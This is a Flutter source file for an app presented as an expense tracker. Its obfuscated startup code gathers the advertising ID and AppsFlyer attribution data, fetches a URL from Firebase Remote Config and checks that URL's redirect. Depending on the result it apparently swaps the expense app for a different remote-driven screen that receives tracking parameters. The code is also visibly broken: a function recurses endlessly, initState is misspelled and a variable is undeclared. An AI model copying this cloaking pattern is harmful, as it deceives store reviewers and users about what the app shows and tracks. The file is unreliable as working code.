import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:expense_test/features/splash/firebase_options.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:hive_flutter/hive_flutter.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/money/bloc/money_bloc.dart';
import 'features/money/models/money.dart';
import 'features/splash/greetings_page.dart';
import 'features/splash/splash_page.dart';
import 'features/target/bloc/target_bloc.dart';
import 'features/target/models/target.dart';

late AppsflyerSdk meedes;
String fjsidfojds = '';
bool mfdklsfmsd = false;
String x2 = '';
String njdkaskjdsa = '';
String modaslmdsa = '';
String x1 = '';
String getxer = '';
Map mfklsdmfkldsf = {};
String mklfsdlfsd = '';
Map njkfnsdkxkds = {};
bool fmjsdkfnjksd = false;
String mfkdmslksdf = '';
String x4 = '';
String x5 = '';
String mklfmsfsfdlsmflksdf = '';
String df = '';
String selfer = '';
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await Hive.initFlutter();
  Hive.registerAdapter(MoneyAdapter());
  kofmsdkfdsflmdsfksd();
  Hive.registerAdapter(TargetAdapter());
  runApp(const MyApp());
}

Future<void> kofmsdkfdsflmdsfksd() async {
  final AppsFlyerOptions nfjksdfkds = AppsFlyerOptions(
    showDebug: false,
    afDevKey: '36A2YtCrzbPFe9egufGekG',
    appId: '6535678558',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  meedes = AppsflyerSdk(nfjksdfkds);

  await meedes.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  meedes.onAppOpenAttribution((res) {
    // setState(() {
    //   mfklsdmfkldsf = res;
    //   modaslmdsa = res['payload']
    //       .entries
    //       .where((e) => ![
    //             'install_time',
    //             'click_time',
    //             'af_status',
    //             'is_first_launch'
    //           ].contains(e.key))
    //       .map((e) => '&${e.key}=${e.value}')
    //       .join();
    //   klmdaslmfdlsa = '&campaign=${res['campaign'] ?? ''}';
    //   lkfosdpfsd = '&media_source=${res['media_source'] ?? ''}';
    // });
  });

  meedes.onInstallConversionData((res) {
    njkfnsdkxkds = res;
    fmjsdkfnjksd = res['payload']['is_first_launch'];
    mfkdmslksdf = res['payload']['af_status'];
    x2 = '&is_first_launch=$fmjsdkfnjksd&af_status=$mfkdmslksdf';
  });

  meedes.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    mfklsdmfkldsf = dp.toJson();
  });
  meedes.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

Future<String> fsdfdsfs() async {
  String mfsdnjkfsd = await AppTrackingTransparency.getAdvertisingIdentifier();
  getxer = mfsdnjkfsd;
  return mfsdnjkfsd;
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  void iniState() {
    super.initState();
    njfksdkjfndskfsd();
    leedr();
  }

  Future<bool> splash() async {
    final finelax = FirebaseRemoteConfig.instance;
    await finelax.fetchAndActivate();
    String malfer = finelax.getString('main');
    String gelfer = finelax.getString('second');
    x1 = malfer;
    selfer = gelfer;
    final maor = HttpClient();
    final appdsa = Uri.parse(x1);
    final daor = await maor.getUrl(appdsa);
    daor.followRedirects = false;
    final response = await daor.close();
    if (response.headers.value(HttpHeaders.locationHeader) != selfer) {
      return true;
    }
    leedr();
    return malfer.contains('noneer') ? false : true;
  }

  Future<String> njfksdkjfndskfsd() async {
    String belfer = await AppTrackingTransparency.getAdvertisingIdentifier();
    getxer = belfer;
    return belfer;
  }

  Future<void> leedr() async {
    await leedr();
    final AppsFlyerOptions forlxw = AppsFlyerOptions(
      showDebug: false,
      afDevKey: '36A2YtCrzbPFe9egufGekG',
      appId: '6535678558',
      timeToWaitForATTUserAuthorization: 15,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
      manualStart: true,
    );
    meedes = AppsflyerSdk(forlxw);

    await meedes.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    meedes.onAppOpenAttribution((res) {
      setState(() {
        mfklsdmfkldsf = res;
        modaslmdsa = res['payload']
            .entries
            .where((e) => ![
                  'install_time',
                  'click_time',
                  'af_status',
                  'is_first_launch'
                ].contains(e.key))
            .map((e) => '&${e.key}=${e.value}')
            .join();
        x4 = '&campaign=${res['campaign'] ?? ''}';
        x5 = '&media_source=${res['media_source'] ?? ''}';
      });
    });

    meedes.onInstallConversionData((res) {
      njkfnsdkxkds = res;
      fmjsdkfnjksd = res['payload']['is_first_launch'];
      mfkdmslksdf = res['payload']['af_status'];
      x2 = '&is_first_launch=$fmjsdkfnjksd&af_status=$mfkdmslksdf';
    });

    meedes.onDeepLinking((DeepLinkResult dp) {
      switch (dp.status) {
        case Status.FOUND:
          print(dp.deepLink?.toString());
          print("deep link value: ${dp.deepLink?.deepLinkValue}");
          break;
        case Status.NOT_FOUND:
          print("deep link not found");
          break;
        case Status.ERROR:
          print("deep link error: ${dp.error}");
          break;
        case Status.PARSE_ERROR:
          print("deep link status parsing error");
          break;
      }
      print("onDeepLinking res: " + dp.toString());

      mfklsdmfkldsf = dp.toJson();
    });
    x3 = await meedes.getAppsFlyerUID() ?? '';
    x3 = '&appsflyerId=$x3';
    meedes.startSDK(
      onSuccess: () {
        print("AppsFlyer SDK initialized successfully.");
      },
    );
    setState(() {});
  }

  @override
  Widget build(BuildContext context) {
    return MultiBlocProvider(
      providers: [
        BlocProvider(create: (context) => HomeBloc()),
        BlocProvider(create: (context) => MoneyBloc()),
        BlocProvider(create: (context) => TargetBloc()),
      ],
      child: FutureBuilder<bool>(
          future: splash(),
          builder: (context, snapshot) {
            if (snapshot.connectionState == ConnectionState.waiting) {
              return Container(
                color: Colors.white,
              );
            } else {
              if (snapshot.data == true && x1 != '') {
                return MaterialApp(
                  debugShowCheckedModeBanner: false,
                  home: MainScreen(
                    d1: x1,
                    d2: x2,
                    d3: x3,
                    d4: x4,
                    d5: x5,
                  ),
                );
              } else {
                return MaterialApp.router(
                  debugShowCheckedModeBanner: false,
                  theme: theme,
                  routerConfig: routerConfig,
                );
              }
            }
          }),
    );
  }
}
